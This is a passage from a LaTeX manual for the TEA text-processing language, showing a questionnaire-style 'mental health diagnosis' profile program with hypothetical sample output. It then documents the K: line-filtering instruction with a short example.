v:vPROMPT # store prompt

l:lPROMPTFAM_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTFAM_WANTS
f:^[nN]$:lFAMDONE_WANTS
x:{
- } | v:vANS
y:vFAM_WANTS | x*!:vANS | v:vFAM_WANTS #update list...
j:lPROMPTFAM_WANTS #loop: get more answers for this category...

l:lFAMDONE_WANTS
y:vFAM_WANTS | x:{
FAMILY-WANTED: } | v:vPROF_FAM_WANTS 

###---[FAMILY: Challenges ]
v:vFAM_PROBS:{} #initially empty
v:vPROMPT_FAM_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to FAMILY, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_FAM_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTFAM_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTFAM_PROBS
f:^[nN]$:lFAMDONE_PROBS
x:{
- } | v:vANS
y:vFAM_PROBS | x*!:vANS | v:vFAM_PROBS #update list...
j:lPROMPTFAM_PROBS #loop: get more answers for this category...

l:lFAMDONE_PROBS
y:vFAM_PROBS | x:{
FAMILY-PROBLEMS: } | v:vPROF_FAM_PROBS


###---[FAMILY: Solutions ]
v:vFAM_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_FAM_WANTS:vPROF_FAM_PROBS | v:vFAM_STATUS
v:vPROMPT_FAM_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to FAMILY, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_FAM_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vFAM_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTFAM_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTFAM_SOLNS
f:^[nN]$:lFAMDONE_SOLNS
x:{
- } | v:vANS
y:vFAM_SOLNS | x*!:vANS | v:vFAM_SOLNS #update list...
j:lPROMPTFAM_SOLNS #loop: get more answers for this category...

l:lFAMDONE_SOLNS
y:vFAM_SOLNS | x:{
FAMILY-SOLUTIONS: } | v:vPROF_FAM_SOLNS

#---------| FRIENDSHIP |------------------
###---[FRIENDSHIP: Wants ]
v:vFRIEND_WANTS:{} #initially empty
v:vPROMPT_FRIEND_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to FRIENDSHIP, what does _ WANT/NEED?}
r*:vPROMPT_FRIEND_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTFRIEND_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTFRIEND_WANTS
f:^[nN]$:lFRIENDDONE_WANTS
x:{
- } | v:vANS
y:vFRIEND_WANTS | x*!:vANS | v:vFRIEND_WANTS #update list...
j:lPROMPTFRIEND_WANTS #loop: get more answers for this category...

l:lFRIENDDONE_WANTS
y:vFRIEND_WANTS | x:{
FRIENDSHIP-WANTED: } | v:vPROF_FRIEND_WANTS 

###---[FRIENDSHIP: Challenges ]
v:vFRIEND_PROBS:{} #initially empty
v:vPROMPT_FRIEND_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to FRIENDSHIP, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_FRIEND_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTFRIEND_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTFRIEND_PROBS
f:^[nN]$:lFRIENDDONE_PROBS
x:{
- } | v:vANS
y:vFRIEND_PROBS | x*!:vANS | v:vFRIEND_PROBS #update list...
j:lPROMPTFRIEND_PROBS #loop: get more answers for this category...

l:lFRIENDDONE_PROBS
y:vFRIEND_PROBS | x:{
FRIENDSHIP-PROBLEMS: } | v:vPROF_FRIEND_PROBS


###---[FRIENDSHIP: Solutions ]
v:vFRIEND_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_FRIEND_WANTS:vPROF_FRIEND_PROBS | v:vFRIEND_STATUS
v:vPROMPT_FRIEND_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to FRIENDSHIP, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_FRIEND_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vFRIEND_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTFRIEND_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTFRIEND_SOLNS
f:^[nN]$:lFRIENDDONE_SOLNS
x:{
- } | v:vANS
y:vFRIEND_SOLNS | x*!:vANS | v:vFRIEND_SOLNS #update list...
j:lPROMPTFRIEND_SOLNS #loop: get more answers for this category...

l:lFRIENDDONE_SOLNS
y:vFRIEND_SOLNS | x:{
FRIENDSHIP-SOLUTIONS: } | v:vPROF_FRIEND_SOLNS


#---------| EDUCATION |------------------
###---[EDUCATION: Wants ]
v:vEDUC_WANTS:{} #initially empty
v:vPROMPT_EDUC_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to EDUCATION, what does _ WANT/NEED?}
r*:vPROMPT_EDUC_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTEDUC_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTEDUC_WANTS
f:^[nN]$:lEDUCDONE_WANTS
x:{
- } | v:vANS
y:vEDUC_WANTS | x*!:vANS | v:vEDUC_WANTS #update list...
j:lPROMPTEDUC_WANTS #loop: get more answers for this category...

l:lEDUCDONE_WANTS
y:vEDUC_WANTS | x:{
EDUCATION-WANTED: } | v:vPROF_EDUC_WANTS 

###---[EDUCATION: Challenges ]
v:vEDUC_PROBS:{} #initially empty
v:vPROMPT_EDUC_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to EDUCATION, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_EDUC_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTEDUC_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTEDUC_PROBS
f:^[nN]$:lEDUCDONE_PROBS
x:{
- } | v:vANS
y:vEDUC_PROBS | x*!:vANS | v:vEDUC_PROBS #update list...
j:lPROMPTEDUC_PROBS #loop: get more answers for this category...

l:lEDUCDONE_PROBS
y:vEDUC_PROBS | x:{
EDUCATION-PROBLEMS: } | v:vPROF_EDUC_PROBS


###---[EDUCATION: Solutions ]
v:vEDUC_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_EDUC_WANTS:vPROF_EDUC_PROBS | v:vEDUC_STATUS
v:vPROMPT_EDUC_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to EDUCATION, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_EDUC_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vEDUC_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTEDUC_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTEDUC_SOLNS
f:^[nN]$:lEDUCDONE_SOLNS
x:{
- } | v:vANS
y:vEDUC_SOLNS | x*!:vANS | v:vEDUC_SOLNS #update list...
j:lPROMPTEDUC_SOLNS #loop: get more answers for this category...

l:lEDUCDONE_SOLNS
y:vEDUC_SOLNS | x:{
EDUCATION-SOLUTIONS: } | v:vPROF_EDUC_SOLNS

#---------| BUSINESS |------------------
###---[BUSINESS: Wants ]
v:vBUS_WANTS:{} #initially empty
v:vPROMPT_BUS_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to BUSINESS, what does _ WANT/NEED?}
r*:vPROMPT_BUS_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTBUS_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTBUS_WANTS
f:^[nN]$:lBUSDONE_WANTS
x:{
- } | v:vANS
y:vBUS_WANTS | x*!:vANS | v:vBUS_WANTS #update list...
j:lPROMPTBUS_WANTS #loop: get more answers for this category...

l:lBUSDONE_WANTS
y:vBUS_WANTS | x:{
BUSINESS-WANTED: } | v:vPROF_BUS_WANTS 

###---[BUSINESS: Challenges ]
v:vBUS_PROBS:{} #initially empty
v:vPROMPT_BUS_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to BUSINESS, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_BUS_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTBUS_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTBUS_PROBS
f:^[nN]$:lBUSDONE_PROBS
x:{
- } | v:vANS
y:vBUS_PROBS | x*!:vANS | v:vBUS_PROBS #update list...
j:lPROMPTBUS_PROBS #loop: get more answers for this category...

l:lBUSDONE_PROBS
y:vBUS_PROBS | x:{
BUSINESS-PROBLEMS: } | v:vPROF_BUS_PROBS


###---[BUSINESS: Solutions ]
v:vBUS_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_BUS_WANTS:vPROF_BUS_PROBS | v:vBUS_STATUS
v:vPROMPT_BUS_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to BUSINESS, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_BUS_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vBUS_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTBUS_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTBUS_SOLNS
f:^[nN]$:lBUSDONE_SOLNS
x:{
- } | v:vANS
y:vBUS_SOLNS | x*!:vANS | v:vBUS_SOLNS #update list...
j:lPROMPTBUS_SOLNS #loop: get more answers for this category...

l:lBUSDONE_SOLNS
y:vBUS_SOLNS | x:{
BUSINESS-SOLUTIONS: } | v:vPROF_BUS_SOLNS

#---------| SPIRIT |------------------
###---[SPIRIT: Wants ]
v:vSPI_WANTS:{} #initially empty
v:vPROMPT_SPI_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to SPIRIT, what does _ WANT/NEED?}
r*:vPROMPT_SPI_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTSPI_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTSPI_WANTS
f:^[nN]$:lSPIDONE_WANTS
x:{
- } | v:vANS
y:vSPI_WANTS | x*!:vANS | v:vSPI_WANTS #update list...
j:lPROMPTSPI_WANTS #loop: get more answers for this category...

l:lSPIDONE_WANTS
y:vSPI_WANTS | x:{
SPIRIT-WANTED: } | v:vPROF_SPI_WANTS 

###---[SPIRIT: Challenges ]
v:vSPI_PROBS:{} #initially empty
v:vPROMPT_SPI_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to SPIRIT, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_SPI_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTSPI_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTSPI_PROBS
f:^[nN]$:lSPIDONE_PROBS
x:{
- } | v:vANS
y:vSPI_PROBS | x*!:vANS | v:vSPI_PROBS #update list...
j:lPROMPTSPI_PROBS #loop: get more answers for this category...

l:lSPIDONE_PROBS
y:vSPI_PROBS | x:{
SPIRIT-PROBLEMS: } | v:vPROF_SPI_PROBS


###---[SPIRIT: Solutions ]
v:vSPI_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_SPI_WANTS:vPROF_SPI_PROBS | v:vSPI_STATUS
v:vPROMPT_SPI_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to SPIRIT, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_SPI_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vSPI_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTSPI_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTSPI_SOLNS
f:^[nN]$:lSPIDONE_SOLNS
x:{
- } | v:vANS
y:vSPI_SOLNS | x*!:vANS | v:vSPI_SOLNS #update list...
j:lPROMPTSPI_SOLNS #loop: get more answers for this category...

l:lSPIDONE_SOLNS
y:vSPI_SOLNS | x:{
SPIRIT-SOLUTIONS: } | v:vPROF_SPI_SOLNS

#---------| SEX |------------------
###---[SEX: Wants ]
v:vSEX_WANTS:{} #initially empty
v:vPROMPT_SEX_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to SEX, what does _ WANT/NEED?}
r*:vPROMPT_SEX_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTSEX_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTSEX_WANTS
f:^[nN]$:lSEXDONE_WANTS
x:{
- } | v:vANS
y:vSEX_WANTS | x*!:vANS | v:vSEX_WANTS #update list...
j:lPROMPTSEX_WANTS #loop: get more answers for this category...

l:lSEXDONE_WANTS
y:vSEX_WANTS | x:{
SEX-WANTED: } | v:vPROF_SEX_WANTS 

###---[SEX: Challenges ]
v:vSEX_PROBS:{} #initially empty
v:vPROMPT_SEX_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to SEX, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_SEX_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTSEX_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTSEX_PROBS
f:^[nN]$:lSEXDONE_PROBS
x:{
- } | v:vANS
y:vSEX_PROBS | x*!:vANS | v:vSEX_PROBS #update list...
j:lPROMPTSEX_PROBS #loop: get more answers for this category...

l:lSEXDONE_PROBS
y:vSEX_PROBS | x:{
SEX-PROBLEMS: } | v:vPROF_SEX_PROBS


###---[SEX: Solutions ]
v:vSEX_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_SEX_WANTS:vPROF_SEX_PROBS | v:vSEX_STATUS
v:vPROMPT_SEX_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to SEX, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_SEX_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vSEX_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTSEX_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTSEX_SOLNS
f:^[nN]$:lSEXDONE_SOLNS
x:{
- } | v:vANS
y:vSEX_SOLNS | x*!:vANS | v:vSEX_SOLNS #update list...
j:lPROMPTSEX_SOLNS #loop: get more answers for this category...

l:lSEXDONE_SOLNS
y:vSEX_SOLNS | x:{
SEX-SOLUTIONS: } | v:vPROF_SEX_SOLNS

#---------| PHYSICAL HEALTH |------------------
###---[PHYSICAL HEALTH: Wants ]
v:vPHYS_WANTS:{} #initially empty
v:vPROMPT_PHYS_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to PHYSICAL HEALTH, what does _ WANT/NEED?}
r*:vPROMPT_PHYS_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTPHYS_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTPHYS_WANTS
f:^[nN]$:lPHYSDONE_WANTS
x:{
- } | v:vANS
y:vPHYS_WANTS | x*!:vANS | v:vPHYS_WANTS #update list...
j:lPROMPTPHYS_WANTS #loop: get more answers for this category...

l:lPHYSDONE_WANTS
y:vPHYS_WANTS | x:{
PHYSICAL HEALTH-WANTED: } | v:vPROF_PHYS_WANTS 

###---[PHYSICAL HEALTH: Challenges ]
v:vPHYS_PROBS:{} #initially empty
v:vPROMPT_PHYS_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to PHYSICAL HEALTH, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_PHYS_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTPHYS_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTPHYS_PROBS
f:^[nN]$:lPHYSDONE_PROBS
x:{
- } | v:vANS
y:vPHYS_PROBS | x*!:vANS | v:vPHYS_PROBS #update list...
j:lPROMPTPHYS_PROBS #loop: get more answers for this category...

l:lPHYSDONE_PROBS
y:vPHYS_PROBS | x:{
PHYSICAL HEALTH-PROBLEMS: } | v:vPROF_PHYS_PROBS


###---[PHYSICAL HEALTH: Solutions ]
v:vPHYS_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_PHYS_WANTS:vPROF_PHYS_PROBS | v:vPHYS_STATUS
v:vPROMPT_PHYS_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to PHYSICAL HEALTH, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_PHYS_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vPHYS_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTPHYS_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTPHYS_SOLNS
f:^[nN]$:lPHYSDONE_SOLNS
x:{
- } | v:vANS
y:vPHYS_SOLNS | x*!:vANS | v:vPHYS_SOLNS #update list...
j:lPROMPTPHYS_SOLNS #loop: get more answers for this category...

l:lPHYSDONE_SOLNS
y:vPHYS_SOLNS | x:{
PHYSICAL HEALTH-SOLUTIONS: } | v:vPROF_PHYS_SOLNS

#---------| MENTAL HEALTH |------------------
###---[MENTAL HEALTH: Wants ]
v:vMENT_WANTS:{} #initially empty
v:vPROMPT_MENT_WANTS:{--[ENTER 'n' or 'N' to complete list]--
With regards to MENTAL HEALTH, what does _ WANT/NEED?}
r*:vPROMPT_MENT_WANTS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTMENT_WANTS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTMENT_WANTS
f:^[nN]$:lMENTDONE_WANTS
x:{
- } | v:vANS
y:vMENT_WANTS | x*!:vANS | v:vMENT_WANTS #update list...
j:lPROMPTMENT_WANTS #loop: get more answers for this category...

l:lMENTDONE_WANTS
y:vMENT_WANTS | x:{
MENTAL HEALTH-WANTED: } | v:vPROF_MENT_WANTS 

###---[MENTAL HEALTH: Challenges ]
v:vMENT_PROBS:{} #initially empty
v:vPROMPT_MENT_PROBS:{--[ENTER 'n' or 'N' to complete list]--
With regards to MENTAL HEALTH, what PROBLEMS/CHALLENGES does _ face or have?}
r*:vPROMPT_MENT_PROBS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt

l:lPROMPTMENT_PROBS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTMENT_PROBS
f:^[nN]$:lMENTDONE_PROBS
x:{
- } | v:vANS
y:vMENT_PROBS | x*!:vANS | v:vMENT_PROBS #update list...
j:lPROMPTMENT_PROBS #loop: get more answers for this category...

l:lMENTDONE_PROBS
y:vMENT_PROBS | x:{
MENTAL HEALTH-PROBLEMS: } | v:vPROF_MENT_PROBS


###---[MENTAL HEALTH: Solutions ]
v:vMENT_SOLNS:{} #initially empty
#Build a prompt displaying category wants and challenges too...
g*:{}:vPROF_HEADER:vPROF_MENT_WANTS:vPROF_MENT_PROBS | v:vMENT_STATUS
v:vPROMPT_MENT_SOLNS:{--[ENTER 'n' or 'N' to complete list]--
With regards to MENTAL HEALTH, what SOLUTIONS would you recommend for _?}
r*:vPROMPT_MENT_SOLNS:vPLACEHOLDER:vCLIENT_NAME
v:vPROMPT # store prompt
g*:{
---[THUS]---
}:vMENT_STATUS:vPROMPT | v:vPROMPT # override

l:lPROMPTMENT_SOLNS
y:vPROMPT | i*:
d:^[ ]*$
f:^$:lPROMPTMENT_SOLNS
f:^[nN]$:lMENTDONE_SOLNS
x:{
- } | v:vANS
y:vMENT_SOLNS | x*!:vANS | v:vMENT_SOLNS #update list...
j:lPROMPTMENT_SOLNS #loop: get more answers for this category...

l:lMENTDONE_SOLNS
y:vMENT_SOLNS | x:{
MENTAL HEALTH-SOLUTIONS: } | v:vPROF_MENT_SOLNS


###########################[ COMPLETE PROFILE ]###################
v:vCAT_DELIM:{
---------X---------X---------X----------
} #delimiter for categories
g*:{}:vPROF_HEADER:vCAT_DELIM:vPROF_FAM_WANTS:vPROF_FAM_PROBS:vPROF_FAM_SOLNS:vCAT_DELIM:vPROF_FRIEND_WANTS:vPROF_FRIEND_PROBS:vPROF_FRIEND_SOLNS:vCAT_DELIM:vPROF_EDUC_WANTS:vPROF_EDUC_PROBS:vPROF_EDUC_SOLNS:vCAT_DELIM:vPROF_BUS_WANTS:vPROF_BUS_PROBS:vPROF_BUS_SOLNS:vCAT_DELIM:vPROF_SPI_WANTS:vPROF_SPI_PROBS:vPROF_SPI_SOLNS:vCAT_DELIM:vPROF_SEX_WANTS:vPROF_SEX_PROBS:vPROF_SEX_SOLNS:vCAT_DELIM:vPROF_PHYS_WANTS:vPROF_PHYS_PROBS:vPROF_PHYS_SOLNS:vCAT_DELIM:vPROF_MENT_WANTS:vPROF_MENT_PROBS:vPROF_MENT_SOLNS:vCAT_DELIM

v:vPROFILE # update/override profile

####[ PRINT PROFILE ]
y:vPROFILE
k!:^[ ]*$
   \end{lstlisting}
   
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: MHDP: MENTAL HEALTH DIAGNOSIS PROGRAM v1.2}
  \label{FIGJEXA}
  
  }


\vspace{2em}

That program, despite looking somewhat long, is actually quite basic and straight-to-the-point. It essentially does what is says it does --- help systematically, and objectively build a health profile for a named person at a specific date, and from which profile, holistic solutions to a person's core problems --- spanning 8 meaningful and impactful categories; family, friendship, education, business, spirit, sex, physical and mental health, and from which, problems that underlie a person's overall lack of health, happiness and life-satisfaction can be identified and resolved once and for all. It can be used to help others, but a serious, sincere and knowledgeable person can also use it to help themselves out of any serious life-problem.


\vspace{2em}

Hereafter, we take some look at how the program's interfaces and functionality looks like, and then shall also look at a sample, hypothetical profile/output the program can help build after a user-session is completed properly.


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/hdp_v_1.2_landing_screen.png}\\
   \caption{HDP session landing screen (on WEB)}
  \label{FIGHDP1}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/hdp_v_1.2_landing_screen_name_prompt.png}\\
   \caption{HDP session name prompt screen (on CLI)}
  \label{FIGHDP2}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/hdp_v_1.2_landing_screen_session_prompt.png}\\
   \caption{HDP session solutions prompt screen (on CLI)}
  \label{FIGHDP3}
  \end{center}
\end{figure}
 

{
\small
  \begin{tcbverbatim}[title=Sample Output from HDP HEALTH DIAGNOSIS]
MENTAL HEALTH PROFILE for [John Doe] ON [Wednesday, 03 December 2025]:
---------X---------X---------X----------
FAMILY-WANTED: 
- A nice family
- About 4 girls and 4 boys
FAMILY-PROBLEMS: 
- The wife is abroad
- 5 kids thus far, all of them girls.
FAMILY-SOLUTIONS: 
- Wait for wife to return
- If the next kid from same wife is also a girl, maybe try a different route.
---------X---------X---------X----------
FRIENDSHIP-WANTED: 
- Loyal friends
- Netizens
FRIENDSHIP-PROBLEMS: 
- Friends are too plastic lately.
FRIENDSHIP-SOLUTIONS: 
- Get a Pen-friend or a remote friend.
- An old acquaintance from school or work might make a good friend.
---------X---------X---------X----------
EDUCATION-WANTED: 
- 3 PhDs
EDUCATION-PROBLEMS: 
- The Schools are expensive.
EDUCATION-SOLUTIONS: 
- Try online courses.
- Get a PhD that combines all the other 3.
---------X---------X---------X----------
BUSINESS-WANTED: 
- A food processing business.
- High Profits at their business.
BUSINESS-PROBLEMS: 
- Didn't study commerce at school.
- Several attempted businesses have failed.
BUSINESS-SOLUTIONS: 
- Start small, perhaps initially focusing on just one or two ventures.
- If one works out, focus on that.
---------X---------X---------X----------
SPIRIT-WANTED: 
- The support of their guardian angel.
- No bad vibes.
SPIRIT-PROBLEMS: 
- One day, came across a black cat. Says they started having nightmares.
- Prayers take long to work!
SPIRIT-SOLUTIONS: 
- Join a fellowship or spiritual club.
- Learn some basic magick.
- Read and trust scriptures.
---------X---------X---------X----------
SEX-WANTED: 
- A threesome.
- Multiple orgasms at least once in a while.
SEX-PROBLEMS: 
- The girl usually cums first.
- Doesn't trust her sometimes... thinks she's getting sex elsewheret too.
SEX-SOLUTIONS: 
- If she's not your wife, use a condom.
- Try to explore more foreplay, and sex-talk instead of coitus.
---------X---------X---------X----------
PHYSICAL HEALTH-WANTED: 
- 6 packs
- Clear and sharp eye-sight.
PHYSICAL HEALTH-PROBLEMS: 
- Has to work wearing spects most times.
- Feels fatigue even by lunch-time!
PHYSICAL HEALTH-SOLUTIONS: 
- Explore more physical exercise, especially in the early morning.
- Take breaks between long work sessions.
- Take off a day every week, just to slack.
---------X---------X---------X----------
MENTAL HEALTH-WANTED: 
- No anxieties 
- No insomnia.
MENTAL HEALTH-PROBLEMS: 
- Two or three days a week, finds himself waking up mid-sleep for no reason.
- Too uneasy when partner isn't around sometimes.
MENTAL HEALTH-SOLUTIONS: 
- Go to bed only when surely exhausetd.
- Try picking up a hobby like reading books of fiction.
---------X---------X---------X----------
  \end{tcbverbatim}

}




\vspace{2em}

In case one wishes to study the code, run the program or adapt this program to other needs, the following link will load v1.2 of the MHDP into the TEA WEB IDE for you to apply.

\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=.&fc=https://gist.githubusercontent.com/mcnemesis/4181436d3c209bb6e048849643f886e7/raw/mental_health_diagnosis_program.tea}

\vspace{1em}
OR VIA short-url:

\vspace{1em}

 \url{https://bit.ly/mhdprogram}

\vspace{1em}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: K
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{K: KEEP}
\label{SECK}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{KEEP}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item \textbf{Process AI at line-level} --- {\small only TEA instruction that does this, and all its use-cases center around this.}
	\item Conditionally filter out the contents of AI
	\item Keep only what matters in a text, based on a user-specified pattern
	
	\item Keep only lines that DO NOT MATCH a given PATTERN
	\item Construct DYNAMIC FILTERS
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{K:}}
  \label{TABTAZK}
\end{table}


\section{SEMANTICS of K:}
\label{SECSEMK}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

k: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{ k:REGEX } & Only keep lines in AI that match REGEX\\

k!: & INERT\\

\rowcolor{lightgray}\bfseries k!: REGEX & Only keep lines in AI that DON'T match REGEX\\

 \makecell[l]{k*:} & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{ k*:vREGEX\\k*:vREGEX:vNAME\\k*!:vREGEX\\k*!:vREGEX:vNAME} & The vault operating versions of k: and k!: perform corresponding transformations, but instead operate using the regular expression stored in vault vREGEX. If vNAME is specified, operate on string in named vault instead of the AI\\

 
 \hline
\end{tabular}
\caption{The Semantics of K:}
\label{TABSEMK}
\end{table}


\section{NOTES about K:}
\label{SECNOTEK}


\textbf{K:} is for determining what to keep in the Active Input. It is only active --- and thus, not \texttt{INERT} --- when used together with a useful filter --- such as in the following example, where we filter and keep only the lines in a multi-line poem that contain the words or patterns ``I” or ``O”;



  \begin{tcolorbox}[teaterminalstyle, title=K: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
I!:{Myself should tell 
You O my Lord.
I trust You Know Me.} | k:.*\w?[IO]\w?.*
   \end{lstlisting}
  \end{tcolorbox}



\vspace{2em}

Shall return 

\vspace{2em}	


  \begin{tcbverbatim}[title=K: EXAMPLE 1 Output]
You O my Lord.
I trust You Know Me.
  \end{tcbverbatim}


{
\Large

Note that while k: processes AI by splitting it up into lines first, yet, it preserves the original lines by gluing the results back using a single New Line Character (sometimes with a Carriage Return on some systems such as Windows).

}

\vspace{2em}

In terms of TEA utilities for throwing things out of strings, the Keep command mostly helps with filter processing at the line level. For filtering at character or word level, perhaps d: and its inverse d!: are better.




\section{EXAMPLE APPLICATIONS of K:}
\label{SECEXAMPK}


The cases that especially utilize the \textbf{KEEP} TEA primitive are numerous, and more importantly, as introduced in the tables on both the Purpose and Semantics of this instruction, are especially related to having to process text at line-level, and with either static or dynamic filters as specified in the command signature.

